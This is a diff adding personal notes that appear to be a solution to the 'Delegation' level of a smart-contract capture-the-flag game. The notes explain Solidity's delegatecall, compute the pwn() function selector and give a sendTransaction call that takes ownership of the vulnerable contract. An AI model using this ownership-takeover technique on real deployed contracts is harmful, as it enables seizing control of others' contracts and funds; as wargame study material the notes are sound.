@@ -1,0 +1,18 @@
+I feel like delagate calls are asking for trouble.
+delegatecall basically makes a call to another contract while
+maintaining the same env vars as the caller (I think?)
+
+address(delegate).delegatecall(msg.data)
+^^ this sends msg.data to the Delegate contract
+if we can call the pwn() function in this delegatecall, we'll
+gain ownership of the Delegation contract
+
+I had to use a bit of Google for this one, but you have to encode
+the function call you want and put it into the data field:
+
+bytes4(sha3("pwn()")) => 0xdd365b8b
+
+await sendTransaction({
+    from: [hacker address],
+    to: [instance address], 
+    data: "0xdd365b8b"})
